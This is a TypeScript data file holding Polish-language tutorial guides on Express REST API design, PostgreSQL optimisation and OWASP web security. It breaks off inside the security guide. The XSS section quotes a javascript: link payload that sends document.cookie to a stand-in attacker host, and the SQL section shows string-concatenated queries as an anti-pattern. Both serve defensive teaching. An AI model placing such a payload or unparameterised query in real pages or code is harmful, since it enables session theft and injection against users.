import { EditorialGuide } from '../utils/guides';

export const GUIDES_PART_2: EditorialGuide[] = [
  {
    slug: 'projektowanie-rest-api-nodejs-express-standardy',
    title: 'Projektowanie produkcyjnego REST API w Node.js i Express: walidacja, kody HTTP, błędy i paginacja',
    titleEn: 'Designing Production REST APIs in Node.js and Express: Validation, HTTP Status Codes, Errors, and Pagination',
    subtitle: 'Jak zbudować przewidywalny, odporny backend — architektura warstwowa, standard błędów RFC 7807, stronicowanie dużych zbiorów, rate limiting oraz bezpieczne kontrakty HTTP.',
    subtitleEn: 'Build predictable, resilient backends — layered architecture, RFC 7807 error responses, pagination, rate limiting, and clean HTTP contracts.',
    metaDescription: 'Poradnik projektowania REST API w Node.js i Express: struktura router/controller/service, walidacja wejścia, poprawne kody statusu HTTP, paginacja kursorowa i obsługa błędów.',
    category: 'Backend & Bazy Danych',
    categoryEn: 'Backend & Databases',
    publishedAt: '2026-11-05',
    updatedAt: '2026-11-28',
    authorName: 'Zespół Redakcyjny Full Stack Developer Academy',
    authorRole: 'Backend & API Engineering',
    level: 'Średniozaawansowany',
    levelEn: 'Intermediate',
    leadParagraphs: [
      'Uruchomienie pierwszego serwera w Express.js zajmuje dziesięć linijek kodu, ale przepaść między prostym prototypem a produkcyjnym API jest ogromna. W amatorskich projektach wszystkie zapytania trafiają do jednego pliku index.js, każdy błąd zwraca status 200 OK z polem { error: "coś poszło nie tak" }, endpoint listujący użytkowników zrzuca sto tysięcy wierszy bez limitu, a brak walidacji ciała żądania powoduje nieprzewidywalne błędy 500 przy każdym nietypowym zapytaniu.',
      'Dobrze zaprojektowane REST API zachowuje się jak solidny kontrakt: frontend, aplikacja mobilna oraz partnerzy zewnętrzni od razu wiedzą, czego się spodziewać po każdym adresie URL, metodzie HTTP i kodzie odpowiedzi. W tym poradniku pokazujemy kompletny wzorzec backendu w Node.js i Express, który możesz wprost zastosować w projektach komercyjnych i aplikacjach portfolio.',
    ],
    sections: [
      {
        id: 'architektura-warstwowa-i-nazewnictwo',
        heading: 'Architektura warstwowa i spójne nazewnictwo zasobów REST',
        paragraphs: [
          'Pierwszym krokiem do czystego backendu jest rozdzielenie trzech odpowiedzialności: routera (dopasowanie ścieżki URL i middleware autoryzacji), kontrolera (parsowanie i walidacja req.params/req.query/req.body oraz mapowanie wyniku na odpowiedź HTTP) oraz serwisu domenowego (czysta logika biznesowa i komunikacja z bazą danych). Dzięki temu logikę biznesową można przetestować testami jednostkowymi bez uruchamiania serwera HTTP.',
          'W nazewnictwie adresów URL stosuj rzeczowniki w liczbie mnogiej opisujące zasoby, a akcję wyrażaj metodą HTTP — nigdy nie tworz ścieżek typu /getUsersList albo /deleteOrderById. Przykładowo GET /api/v1/projects zwraca stronicowaną listę projektów, POST /api/v1/projects tworzy nowy rekord i zwraca status 201 Created wraz z nagłówkiem Location, PATCH /api/v1/projects/:id aktualizuje wybrane pola, a DELETE /api/v1/projects/:id usuwa zasób zwracając 204 No Content.',
          'Ważną własnością protokołu HTTP jest idempotentność: wielokrotne wysłanie dokładnie tego samego żądania GET, PUT lub DELETE powinno pozostawić system w identycznym stanie. Natomiast operacja POST (np. utworzenie płatności lub zamówienia) nie jest z natury idempotentna, dlatego w krytycznych endpointach finansowych stosuje się nagłówek Idempotency-Key zapobiegający podwójnemu obciążeniu karty po ponowieniu żądania przez sieć.',
        ],
        table: {
          caption: 'Kody statusu HTTP, które każde produkcyjne REST API musi zwracać poprawnie',
          headers: ['Kod', 'Znaczenie', 'Kiedy zwrócić', 'Czego unikać'],
          rows: [
            ['200 OK', 'Sukces operacji odczytu lub aktualizacji', 'GET zasobu, PATCH/PUT z ciałem odpowiedzi', 'Zwracania 200 przy błędzie walidacji lub braku rekordu'],
            ['201 Created', 'Utworzono nowy zasób', 'POST tworzący rekord w bazie', 'Zwracania pustego 200 bez utworzonego ID'],
            ['400 / 422', 'Nieprawidłowe dane wejściowe', 'Brak wymaganego pola, zły format e-mail', 'Zwracania 500 Internal Server Error dla błędu klienta'],
            ['401 / 403', 'Brak uwierzytelnienia / brak uprawnień', '401 brak lub wygasły token; 403 zalogowany bez roli', 'Mylenia 401 (kim jesteś?) z 403 (czy wolno Ci?)'],
            ['404 / 409', 'Nie znaleziono / konflikt stanu', '404 brak ID; 409 duplikat e-maila lub stanu', 'Ujawniania szczegółów cudzych zasobów przy braku dostępu'],
            ['429 / 500', 'Przekroczony limit / nieoczekiwany błąd', '429 rate limit; 500 awaria wewnętrzna', 'Wysyłania stack trace lub zapytań SQL w odpowiedzi 500'],
          ],
        },
      },
      {
        id: 'walidacja-wejscia-i-centralny-error-handler',
        heading: 'Ścisła walidacja danych wejściowych i centralna obsługa błędów (RFC 7807)',
        paragraphs: [
          'Złota zasada bezpieczeństwa backendu brzmi: nigdy nie ufaj niczemu, co przychodzi w obiekcie request — ani req.body, ani req.query, ani nagłówkom. Zanim kontroler przekaże dane do serwisu, zweryfikuj typy, minimalne i maksymalne długości napisów, dozwolone wartości enum oraz limity paginacji. Równie ważne jest jawne wybranie dozwolonych pól (allow-listing) zamiast przekazywania całego req.body wprost do zapytania UPDATE — w przeciwnym razie atakujący może dopisać pole { "role": "admin" } i dokonać eskalacji uprawnień (Mass Assignment).',
          'Wszystkie błędy w aplikacji kieruj do jednego, centralnego middleware obsługi błędów Express o sygnaturze (err, req, res, next). Zwracaj spójny format JSON (na przykład zgodny ze standardem Problem Details RFC 7807: status, code, title, detail, fields). Na produkcji nigdy nie odsyłaj klientowi wewnętrznego stack trace ani surowych komunikatów bazy PostgreSQL — loguj je wyłącznie po stronie serwera ze znacznikiem requestId.',
        ],
        codeSnippet: {
          title: 'Klasa błędu domenowego oraz bezpieczny centralny error handler w Express',
          language: 'typescript',
          code: `export class AppHttpError extends Error {
  constructor(
    public readonly status: number,
    public readonly code: string,
    message: string,
    public readonly fields?: Record<string, string>
  ) {
    super(message);
  }
}

export function errorHandler(err: unknown, req: Request, res: Response, _next: NextFunction) {
  if (err instanceof AppHttpError) {
    return res.status(err.status).json({
      status: err.status,
      code: err.code,
      detail: err.message,
      ...(err.fields ? { fields: err.fields } : {}),
    });
  }

  console.error('[API_UNHANDLED_ERROR]', {
    path: req.originalUrl,
    method: req.method,
    error: err instanceof Error ? err.stack : String(err),
  });

  return res.status(500).json({
    status: 500,
    code: 'INTERNAL_SERVER_ERROR',
    detail: 'Wystąpił nieoczekiwany błąd serwera. Spróbuj ponownie za chwilę.',
  });
}`,
          caption: 'Centralny error handler gwarantuje spójny format JSON dla frontendu i chroni przed wyciekiem szczegółów infrastruktury.',
        },
      },
      {
        id: 'paginacja-filtrowanie-i-rate-limiting',
        heading: 'Paginacja dużych zbiorów, limity i ochrona przed przeciążeniem (Rate Limiting)',
        paragraphs: [
          'Każdy endpoint zwracający kolekcję rekordów musi od pierwszego dnia narzucać domyślny oraz maksymalny limit strony (na przykład domyślnie limit=20, maksymalnie limit=100). Zwracanie pełnej tabeli w jednym zapytaniu działa na komputerze deweloperskim przy dziesięciu rekordach testowych, ale po roku działania w produkcji potrafi wyczerpać pamięć RAM serwera i zerwać połączenia wszystkich klientów.',
          'W przypadku mniejszych katalogów (np. spis kursów czy panel admina z numerami stron) wygodna jest paginacja offsetowa (?page=2&limit=20). Przy szybko rosnących strumieniach danych (historia transakcji, kanał powiadomień, logi aktywności) zdecydowanie wygrywa paginacja kursorowa (keyset pagination: ?cursor=2026-11-28T10:00:00Z_id42&limit=25), ponieważ baza danych korzysta bezpośrednio z indeksu bez kosztownego przeskakiwania milionów wierszy przez OFFSET i nie duplikuje elementów, gdy w międzyczasie pojawią się nowe wpisy.',
          'Nie zapomnij również o ochronie endpointów publicznych i logowania przed nadużyciami: ustaw limit rozmiaru ciała JSON (express.json({ limit: "100kb" })), wprowadź rate limiting na ścieżki uwierzytelniania (np. maksymalnie 10 prób logowania na 15 minut z jednego adresu IP) oraz zadbaj o jawne nagłówki bezpieczeństwa i konfigurację CORS ograniczoną wyłącznie do zaufanych domen frontendowych.',
        ],
        bulletPoints: [
          'Stosuj wersjonowanie adresów (/api/v1/...) przed udostępnieniem API aplikacjom mobilnym lub zewnętrznym klientom.',
          'Wymuszaj maksymalny limit rozmiaru strony (np. Math.min(100, Math.max(1, parsedLimit))) w każdym zapytaniu listującym.',
          'Ogranicz rozmiar payloadu w express.json({ limit: "100kb" }) i konfiguruj timeouty zapytań do zewnętrznych serwisów.',
          'Udostępnij lekki endpoint GET /health sprawdzający żywotność aplikacji oraz połączenie z bazą danych dla orkiestratora.',
        ],
      },
    ],
    keyTakeaways: [
      'Oddzielaj warstwę HTTP (router i kontroler) od czystej logiki biznesowej (serwis) — zyskujesz prostotę utrzymania i łatwe testy.',
      'Używaj właściwych metod HTTP i precyzyjnych kodów statusu (201, 204, 400, 401, 403, 404, 409, 429, 500).',
      'Zawsze stosuj allow-listing pól i walidację runtime po stronie serwera, aby wyeliminować podatność Mass Assignment.',
      'Każdy endpoint zwracający listę powinien mieć twardy limit rozmiaru strony oraz spójną paginację offsetową lub kursorową.',
    ],
    faq: [
      {
        question: 'Czym różni się metoda PUT od PATCH w REST API?',
        answer: 'PUT zastępuje cały zasób nową reprezentacją (brakujące pola mogą zostać wyzerowane lub odrzucone), natomiast PATCH wykonuje częściową aktualizację wyłącznie pól przesłanych w ciele żądania (np. zmianę samego tytułu lub statusu).',
      },
      {
        question: 'Kiedy zwrócić 401 Unauthorized, a kiedy 403 Forbidden?',
        answer: '401 oznacza brak ważnych poświadczeń (użytkownik nie jest zalogowany lub jego token wygasł i musi się ponownie uwierzytelnić). 403 oznacza, że serwer wie kim jest użytkownik, ale jego konto nie ma uprawnień do tej konkretnej akcji lub zasobu.',
      },
      {
        question: 'Czy REST API musi zwracać paginację już w MVP projektu?',
        answer: 'Tak. Dodanie parametrów limit i page/cursor oraz struktury { items, nextCursor, total } na początku zajmuje 15 minut, a chroni przed łamiącymi zmianami kontraktu API w przyszłości, gdy w bazie pojawi się kilkanaście tysięcy rekordów.',
      },
    ],
    relatedLessonIds: ['node-1', 'node-2', 'node-3', 'node-4', 'sec-1'],
    relatedGuideSlugs: [
      'postgresql-indeksy-join-optymalizacja-zapytan',
      'bezpieczenstwo-aplikacji-webowych-owasp-jwt',
      'typescript-w-praktyce-typy-generyki-walidacja',
    ],
  },
  {
    slug: 'postgresql-indeksy-join-optymalizacja-zapytan',
    title: 'PostgreSQL i SQL dla Full Stack Developera: projektowanie schematu, JOIN, indeksy B-Tree i EXPLAIN ANALYZE',
    titleEn: 'PostgreSQL and SQL for Full Stack Developers: Schema Design, JOINs, B-Tree Indexes, and EXPLAIN ANALYZE',
    subtitle: 'Jak projektować czyste relacje w bazie danych, unikać problemu zapytań N+1, rozumieć plany wykonania PostgreSQL i przyspieszać wolne zapytania nawet kilkudziesięciokrotnie.',
    subtitleEn: 'Design clean relational schemas, eliminate N+1 queries, read PostgreSQL execution plans, and speed up slow queries dramatically.',
    metaDescription: 'Praktyczny przewodnik PostgreSQL i SQL: klucze obce, typy JOIN, problem N+1, indeksy B-Tree i złożone, transakcje ACID oraz czytanie EXPLAIN ANALYZE.',
    category: 'Backend & Bazy Danych',
    categoryEn: 'Backend & Databases',
    publishedAt: '2026-11-09',
    updatedAt: '2026-11-28',
    authorName: 'Zespół Redakcyjny Full Stack Developer Academy',
    authorRole: 'Database & Backend Systems',
    level: 'Średniozaawansowany',
    levelEn: 'Intermediate',
    leadParagraphs: [
      'W większości aplikacji webowych wąskim gardłem wydajności nie jest szybkość Reacta ani narzut Express.js — wąskim gardłem jest źle zaprojektowana baza danych oraz brak indeksów na najczęściej filtrowanych kolumnach. Aplikacja potrafi działać błyskawicznie podczas testów z pięćdziesięcioma rekordami, po czym po kilku miesiącach od premiery pojedyncze otwarcie panelu użytkownika zaczyna trwać cztery sekundy.',
      'PostgreSQL to obecnie najpotężniejsza otwarta relacyjna baza danych na rynku: łączy rygor integralności relacyjnej (klucze obce, ograniczenia CHECK, transakcje ACID) z nowoczesnymi funkcjami takimi jak indeksowane kolumny JSONB, wyszukiwanie pełnotekstowe i zapytania oknowe. Zrozumienie relacji, złączeń JOIN oraz mechanizmu EXPLAIN ANALYZE daje Ci jedną z najbardziej poszukiwanych kompetencji w inżynierii oprogramowania.',
    ],
    sections: [
      {
        id: 'schemat-wiezy-integralnosci-i-transakcje',
        heading: 'Projektowanie schematu: pozwól bazie pilnować poprawności danych',
        paragraphs: [
          'Jednym z największych błędów jest przenoszenie całej integralności danych wyłącznie do kodu aplikacji, a w bazie trzymanie luźnych kolumn tekstowych bez ograniczeń. Kod aplikacji może mieć błąd wyścigu (dwa równoległe żądania sprawdzające jednocześnie, czy dany adres e-mail jest wolny) albo zostać uruchomiony z kilku instancji jednocześnie. Tylko baza danych jest w stanie atomowo zagwarantować spójność za pomocą ograniczeń NOT NULL, UNIQUE, FOREIGN KEY oraz CHECK.',
          'Dla kwot pieniężnych nigdy nie używaj typów zmiennoprzecinkowych FLOAT ani DOUBLE PRECISION — reprezentacja binarna generuje błędy zaokrągleń (słynne 0.1 + 0.2 = 0.30000000000000004). Zawsze przechowuj ceny jako dokładny typ NUMERIC(12, 2) albo jako liczbę całkowitą groszy w kolumnie BIGINT. Daty i znaczniki czasu przechowuj konsekwentnie w typie TIMESTAMPTZ (timestamp with time zone) w UTC, a konwersję do strefy użytkownika wykonuj dopiero w warstwie prezentacji.',
          'Każda operacja modyfikująca więcej niż jedną tabelę jednocześnie — na przykład przeniesienie środków między kontami, utworzenie zamówienia wraz z jego pozycjami albo zużycie jednorazowego kuponu rabatowego — musi być otoczona transakcją (BEGIN ... COMMIT / ROLLBACK). Jeśli w połowie procesu nastąpi awaria zasilania lub błąd ograniczenia, PostgreSQL automatycznie wycofa wszystkie częściowe zmiany.',
        ],
      },
      {
        id: 'zrozumienie-join-i-problemu-n-plus-1',
        heading: 'Złączenia JOIN w praktyce oraz jak wyeliminować zabójczy problem N+1',
        paragraphs: [
          'Złączenia JOIN łączą wiersze z powiązanych tabel w jednym zapytaniu po stronie silnika bazy danych. Najczęściej używasz dwóch wariantów: INNER JOIN (zwraca wyłącznie rekordy mające dopasowanie po obu stronach — np. zamówienia posiadające istniejącego klienta) oraz LEFT JOIN (zachowuje wszystkie rekordy z lewej tabeli nawet wtedy, gdy prawa strona jest pusta — np. lista wszystkich kursantów wraz z liczbą ukończonych lekcji, w tym osób z wynikiem 0).',
          'Najczęstszym cichym zabójcą wydajności w aplikacjach korzystających z ORM jest problem zapytań N+1: pobierasz listę 50 modułów kursu jednym zapytaniem, a następnie w pętli dla każdego modułu wykonujesz osobne zapytanie o jego lekcje. Zamiast 1–2 szybkich zapytań serwer wysyła 51 osobnych rund sieciowych do bazy danych. Rozwiązaniem jest pojedyncze zapytanie z LEFT JOIN i agregacją albo pobranie powiązanych rekordów jednym zapytaniem zbiorczym z operatorem WHERE module_id = ANY($1).',
        ],
        codeSnippet: {
          title: 'Jedno zapytanie SQL z LEFT JOIN, agregacją i indeksem zamiast 51 zapytań N+1',
          language: 'sql',
          code: `CREATE INDEX CONCURRENTLY idx_progress_user_completed
  ON lesson_progress (user_id, completed_at DESC);

SELECT
  m.id AS module_id,
  m.title,
  COUNT(l.id) AS total_lessons,
  COUNT(lp.lesson_id) AS completed_lessons
FROM modules m
JOIN lessons l
  ON l.module_id = m.id
LEFT JOIN lesson_progress lp
  ON lp.lesson_id = l.id
 AND lp.user_id = $1
GROUP BY m.id, m.title
ORDER BY m.sort_order ASC;`,
          caption: 'Warunek lp.user_id = $1 znajduje się w klauzuli ON złączenia LEFT JOIN (a nie w WHERE!), aby zachować moduły z zerowym postępem.',
        },
      },
      {
        id: 'indeksy-btree-i-explain-analyze',
        heading: 'Indeksy B-Tree, indeksy złożone i czytanie EXPLAIN ANALYZE',
        paragraphs: [
          'Indeks w bazie danych działa dokładnie jak skorowidz na końcu grubej encyklopedii: zamiast przeglądać wszystkie 500 tysięcy wierszy tabeli od pierwszej do ostatniej strony (Sequential Scan), PostgreSQL w ułamku milisekundy schodzi po zrównoważonym drzewie B-Tree wprost do szukanych rekordów (Index Scan).',
          'Kluczowa zasada przy tworzeniu indeksów złożonych (obejmujących dwie lub trzy kolumny, np. (tenant_id, status, created_at DESC)) dotyczy kolejności kolumn: najbardziej selektywne filtry równościowe (=) umieszczaj z przodu, a kolumny zakresowe (>, <, BETWEEN) i sortowanie (ORDER BY) na końcu. Pamiętaj też, że indeks przyspiesza odczyty (SELECT), ale lekko spowalnia zapisy (INSERT/UPDATE/DELETE) i zajmuje miejsce na dysku — dlatego twórz indeksy na podstawie realnych zapytań, nigdy na ślepo na każdą kolumnę tabeli.',
          'Zanim zgadniesz, dlaczego zapytanie działa wolno, uruchom przed nim EXPLAIN (ANALYZE, BUFFERS). PostgreSQL faktycznie wykona zapytanie i pokaże dokładny plan: ile czasu zajęła każda operacja, czy użyto indeksu czy pełnego skanowania Seq Scan oraz ile stron danych (shared hit / read) pobrano z pamięci podręcznej i dysku.',
        ],
        table: {
          caption: 'Szybka ściągawka z interpretacji wyników EXPLAIN ANALYZE w PostgreSQL',
          headers: ['Węzeł w planie', 'Co oznacza', 'Kiedy wymaga interwencji'],
          rows: [
            ['Seq Scan', 'Pełne skanowanie całej tabeli wiersz po wierszu', 'Gdy tabela ma dziesiątki tysięcy wierszy, a zapytanie wybiera ułamek danych'],
            ['Index Scan', 'Wyszukanie po indeksie + doczytanie wiersza z tabeli', 'Zazwyczaj optymalny stan dla selektywnych zapytań'],
            ['Index Only Scan', 'Wszystkie potrzebne kolumny odczytane wprost z indeksu', 'Najwyższa możliwa wydajność (indeks pokrywający INCLUDE)'],
            ['Hash Join / Nested Loop', 'Strategie łączenia tabel przez planer zapytań', 'Gdy liczba szacowanych wierszy drastycznie odbiega od actual rows (uruchom ANALYZE)'],
          ],
        },
      },
      {
        id: 'migracje-i-bezpieczenstwo-sql',
        heading: 'Bezpieczne migracje schematu i bezwzględna parametryzacja zapytań',
        paragraphs: [
          'Zmiany struktury bazy na produkcji nigdy nie powinny odbywać się przez ręczne wyklikiwanie w konsoli. Każda zmiana schematu powinna być zapisana jako wersjonowany plik migracji w repozytorium Git. Na dużych, aktywnych tabelach dodawanie indeksu wykonuj z klauzulą CREATE INDEX CONCURRENTLY, aby nie blokować zapisów użytkowników podczas budowania indeksu.',
          'Najważniejsza reguła bezpieczeństwa przy pracy z SQL jest absolutnie nienegocjowalna: nigdy nie sklejaj zmiennych użytkownika z tekstem zapytania SQL za pomocą szablonów napisów (`SELECT ... WHERE email = \'${email}\'`). Zawsze korzystaj z zapytań parametryzowanych ($1, $2 w sterowniku pg lub bezpiecznych metod ORM), gdzie silnik bazy danych fizycznie oddziela kod polecenia SQL od przekazanych danych, całkowicie neutralizując ataki SQL Injection.',
        ],
      },
    ],
    keyTakeaways: [
      'Wymuszaj integralność danych na poziomie schematu PostgreSQL (NOT NULL, UNIQUE, FOREIGN KEY, CHECK, TIMESTAMPTZ, NUMERIC).',
      'Eliminuj problem zapytań N+1 łącząc dane przez JOIN, agregacje SQL albo zbiorcze zapytania WHERE id = ANY($1).',
      'Zawsze diagnozuj wolne zapytania za pomocą EXPLAIN (ANALYZE, BUFFERS) zamiast zgadywać i dodawać przypadkowe indeksy.',
      'Każdą wartość z zewnątrz przekazuj wyłącznie jako parametr zapytania ($1, $2), nigdy przez konkatenację napisów.',
    ],
    faq: [
      {
        question: 'Czy PostgreSQL automatycznie tworzy indeksy na kolumnach klucza obcego (FOREIGN KEY)?',
        answer: 'Nie! PostgreSQL automatycznie indeksuje wyłącznie klucze główne (PRIMARY KEY) i ograniczenia UNIQUE. Kolumny klucza obcego (np. user_id w tabeli orders) należy zaindeksować jawnie za pomocą CREATE INDEX, w przeciwnym razie JOIN i usuwanie rodzica wywołają pełny Seq Scan.',
      },
      {
        question: 'Kiedy warto użyć kolumny JSONB w PostgreSQL zamiast osobnej tabeli relacyjnej?',
        answer: 'JSONB świetnie sprawdza się do niestrukturyzowanych metadanych, preferencji UI lub dynamicznych atrybutów (np. parametry techniczne różnych kategorii produktów). Natomiast encje kluczowe domenowo (użytkownicy, zamówienia, płatności, relacje wiele-do-wielu) zawsze powinny mieć klasyczne, typowane tabele.',
      },
      {
        question: 'Czy w 2026 roku warto uczyć się czystego SQL, skoro istnieją ORM takie jak Prisma i Drizzle?',
        answer: 'Zdecydowanie tak. ORM przyspiesza pisanie prostych operacji CRUD, ale gdy pojawi się wolne zapytanie, błąd migracji, potrzeba raportu analitycznego lub problem N+1, tylko znajomość czystego SQL i EXPLAIN ANALYZE pozwala rozwiązać przyczynę źródłową.',
      },
    ],
    relatedLessonIds: ['db-1', 'db-2', 'db-3', 'db-4', 'db-5'],
    relatedGuideSlugs: [
      'projektowanie-rest-api-nodejs-express-standardy',
      'bezpieczenstwo-aplikacji-webowych-owasp-jwt',
      'docker-cicd-wdrozenie-aplikacji-na-produkcje',
    ],
  },
  {
    slug: 'bezpieczenstwo-aplikacji-webowych-owasp-jwt',
    title: 'Bezpieczeństwo aplikacji webowych (OWASP Top 10): XSS, CSRF, SQL Injection, IDOR i bezpieczne sesje JWT',
    titleEn: 'Web Application Security (OWASP Top 10): XSS, CSRF, SQL Injection, IDOR, and Secure JWT Sessions',
    subtitle: 'Jak naprawdę działają najgroźniejsze ataki na aplikacje webowe i jak zamknąć każdą z tych luk konkretnym kodem w React, Node.js, nagłówkach HTTP i bazie danych.',
    subtitleEn: 'How the most dangerous web attacks actually work and how to close every vulnerability with concrete code in React, Node.js, HTTP headers, and SQL.',
    metaDescription: 'Kompletny poradnik bezpieczeństwa aplikacji webowych (OWASP Top 10): ochrona przed XSS, CSRF, SQL Injection, IDOR (Broken Access Control), bezpieczne cookies HttpOnly i JWT.',
    category: 'Bezpieczeństwo & DevOps',
    categoryEn: 'Security & DevOps',
    publishedAt: '2026-11-13',
    updatedAt: '2026-11-28',
    authorName: 'Zespół Redakcyjny Full Stack Developer Academy',
    authorRole: 'Application Security Engineering',
    level: 'Zaawansowany',
    levelEn: 'Advanced',
    leadParagraphs: [
      'Bezpieczeństwo aplikacji webowej nie jest funkcją, którą dokłada się w piątek przed premierą. Wystarczy jeden niezabezpieczony endpoint bez sprawdzenia właściciela zasobu, jeden nieescapowany fragment HTML z komentarza użytkownika albo klucz API zapisany w publicznym repozytorium Git, aby cała baza danych klientów wyciekła w kilka minut. Co gorsza, większość ataków w internecie jest dziś w pełni zautomatyzowana przez boty skanujące nowe domeny w ciągu godzin od ich uruchomienia.',
      'Lista OWASP Top 10 od lat kataloguje najgroźniejsze i najczęściej spotykane błędy bezpieczeństwa w oprogramowaniu webowym. Zamiast abstrakcyjnej teorii rozkładamy poniżej pięć najważniejszych klas podatności na konkretny mechanizm ataku oraz gotowy, produkcyjny sposób obrony w ekosystemie JavaScript, TypeScript, React i Node.js.',
    ],
    sections: [
      {
        id: 'idor-i-broken-access-control',
        heading: 'Numer 1 w OWASP: Broken Access Control i podatność IDOR',
        paragraphs: [
          'Złamana kontrola dostępu (Broken Access Control) od lat zajmuje pierwsze miejsce na liście OWASP Top 10. Jej najbardziej podstępną odmianą jest IDOR (Insecure Direct Object Reference). Scenariusz wygląda niewinnie: użytkownik loguje się i pobiera swoją fakturę spod adresu GET /api/invoices/1042. Serwer sprawdza wyłącznie, czy użytkownik posiada ważny token JWT — nie sprawdza jednak, czy faktura numer 1042 należy do zalogowanego użytkownika. Wystarczy zmienić numer na 1041 i atakujący pobiera prywatne dokumenty innego klienta.',
          'Jedyną skuteczną obroną jest rygorystyczna weryfikacja własności i roli (RBAC) w warstwie serwera przy każdym pojedynczym odczycie, edycji i usunięciu zasobu. Zapytanie do bazy danych powinno łączyć identyfikator zasobu z identyfikatorem zalogowanego użytkownika pochodzącym wyłącznie z zweryfikowanej sesji serwerowej (WHERE id = $1 AND owner_id = $2) — nigdy z pola userId przesłanego przez klienta w ciele żądania.',
        ],
        codeSnippet: {
          title: 'Eliminacja IDOR przez wymuszenie owner_id ze zweryfikowanej sesji',
          language: 'typescript',
          code: `// ZLE: Zaufanie do samego ID zasobu lub userId z req.body
// const invoice = await db.query('SELECT * FROM invoices WHERE id = $1', [req.params.id]);

// DOBRZE: Weryfikacja własności na poziomie zapytania SQL z ID pochodzącym z sesji
app.get('/api/invoices/:id', requireAuth, async (req, res, next) => {
  try {
    const invoiceId = Number(req.params.id);
    if (!Number.isInteger(invoiceId) || invoiceId <= 0) {
      throw new AppHttpError(400, 'INVALID_ID', 'Nieprawidłowy identyfikator faktury.');
    }

    const result = await db.query(
      'SELECT id, amount_cents, issued_at, status FROM invoices WHERE id = $1 AND user_id = $2',
      [invoiceId, req.authUser.id]
    );

    if (result.rows.length === 0) {
      throw new AppHttpError(404, 'NOT_FOUND', 'Nie znaleziono zasobu.');
    }

    return res.json({ invoice: result.rows[0] });
  } catch (err) {
    return next(err);
  }
});`,
          caption: 'Zwracanie 404 zamiast 403 dla cudzych rekordów dodatkowo zapobiega zgadywaniu, jakie ID istnieją w bazie.',
        },
      },
      {
        id: 'xss-i-ochrona-url-w-react',
        heading: 'Cross-Site Scripting (XSS) i ukryta luka w linkach javascript:',
        paragraphs: [
          'Atak XSS polega na wstrzyknięciu złośliwego kodu JavaScript, który wykonuje się w przeglądarce ofiary w kontekście zaufanej domeny. React domyślnie chroni nas przed najprostszym XSS, automatycznie escapując tekst wstawiany w klamrach {userInput}. Nie oznacza to jednak, że aplikacja React jest w stu procentach odporna.',
          'Istnieją dwa krytyczne miejsca, przez które XSS wciąż przedostaje się do aplikacji React: po pierwsze, użycie dangerouslySetInnerHTML bez wcześniejszego oczyszczenia HTML przez zaufaną bibliotekę (np. DOMPurify), a po drugie — wstawienie niezwalidowanego adresu URL od użytkownika do atrybutu href lub src. Jeśli użytkownik poda link do swojego portfolio jako javascript:fetch("https://evil.example/?c="+document.cookie), React wyrenderuje klikalny link, który uruchomi atak w chwili kliknięcia. Każdy zewnętrzny URL akceptuj wyłącznie wtedy, gdy po sparsowaniu przez new URL(input) jego protokół to dokładnie https: lub http:.',
          'Drugą linią obrony przed XSS są nagłówki odpowiedzi HTTP, szczególnie Content-Security-Policy (CSP), ograniczający domeny, z których przeglądarka ma prawo wykonywać skrypty, oraz X-Content-Type-Options: nosniff.',
        ],
      },
      {
        id: 'sesje-jwt-cookies-httponly-i-csrf',
        heading: 'Gdzie przechowywać token sesji: localStorage kontra HttpOnly Cookie i CSRF',
        paragraphs: [
          'To jeden z najczęstszych dylematów architektów Full Stack: zapisać token JWT w localStorage czy w ciasteczku z flagami HttpOnly, Secure i SameSite=Lax? Każdy token zapisany w localStorage jest w pełni odczytywalny przez dowolny skrypt JavaScript działający na stronie — oznacza to, że pojedyncza podatność XSS (albo skompromitowana biblioteka zewnętrzna z npm) pozwala na kradzież tokenów wszystkich zalogowanych użytkowników.',
          'Bezpieczniejszym rozwiązaniem dla aplikacji przeglądarkowych jest ciasteczko sesyjne z flagą HttpOnly (niedostępne z poziomu document.cookie w JS), Secure (przesyłane wyłącznie po szyfrowanym HTTPS) oraz SameSite=Lax (lub Strict), które w nowoczesnych przeglądarkach blokuje zdecydowaną większość ataków Cross-Site Request Forgery (CSRF). Jeśli API akceptuje żądania modyfikujące stan z autoryzacją w ciasteczkach, dołóż dodatkową ochronę CSRF (weryfikacja nagłówka Origin/Referer lub token Synchronizer/Double-Submit) oraz krótkie czasy życia tokenów dostępowych z rotacją tokenów odświeżających.',
        ],
        table: {
          caption: 'Porównanie strategii przechowywania tokenu uwierzytelniania po stronie przeglądarki',
          headers: ['Mechanizm', 'Odporność na kradzież przez XSS', 'Wymaga ochrony CSRF', 'Rekomendacja'],
          rows: [
            ['HttpOnly + Secure + SameSite Cookie', 'Wysoka (JS nie ma dostępu do tokenu)', 'Tak (SameSite=Lax + sprawdzenie Origin)', 'Preferowany standard dla aplikacji webowych'],
            ['Pamięć RAM (zmienna JS) + HttpOnly Refresh', 'Średnia/Wysoka (krótki czas życia access token)', 'Tak na endpoint /refresh', 'Dobre rozwiązanie dla rozproszonych SPA / OAuth'],
            ['localStorage / sessionStorage', 'Niska (każdy XSS odczyta token natychmiast)', 'Nie (wysyłany ręcznie w nagłówku Bearer)', 'Unikaj dla długowiecznych tokenów sesyjnych'],
          ],
        },
      },
      {
        id: 'sekrety-hasla-i-higiena-zaleznosci',
        heading: 'Hasła, zmienne środowiskowe i higiena zależności w projekcie',
        paragraphs: [
          'Hasła użytkowników nigdy nie mogą trafiać do bazy w postaci jawnej ani zahaszowane szybką funkcją skrótu taką jak MD5 czy SHA-256 — współczesne karty graficzne łamią miliardy takich skrótów na sekundę. Stosuj wyłącznie celowo powolne algorytmy z unikalną solą: Argon2id lub bcrypt z odpowiednim współczynnikiem kosztu (np. cost 12).',
          'Równie rygorystycznie traktuj sekrety aplikacji (hasła bazy danych, klucze API, sekrety podpisujące JWT i webhooki płatnicze). Nigdy nie umieszczaj ich w kodzie źródłowym ani w zmiennych prefiksowanych VITE_ lub NEXT_PUBLIC_, ponieważ takie zmienne są na stałe wbudowywane w publiczną paczkę JavaScript pobieraną przez przeglądarkę każdego odwiedzającego. Przechowuj je wyłącznie w zmiennych środowiskowych serwera, a w repozytorium utrzymuj wyłącznie plik .env.example z pustymi nazwami zmiennych.',
        ],
        bulletPoints: [
          'Zawsze waliduj protokół linków podawanych przez użytkowników (tylko https: i http:), blokując javascript: i data:.',
          'Weryfikuj uprawnienia i właściciela zasobu w każdym endpointcie backendowym (ochrona przed IDOR i eskalacją ról).',
          'Ustawiaj nagłówki bezpieczeństwa (Helmet / CSP, HSTS, X-Frame-Options, Referrer-Policy) w konfiguracji serwera.',
          'Regularnie uruchamiaj npm audit oraz automatyczne aktualizacje zależności pod kątem krytycznych podatności CVE.',
        ],
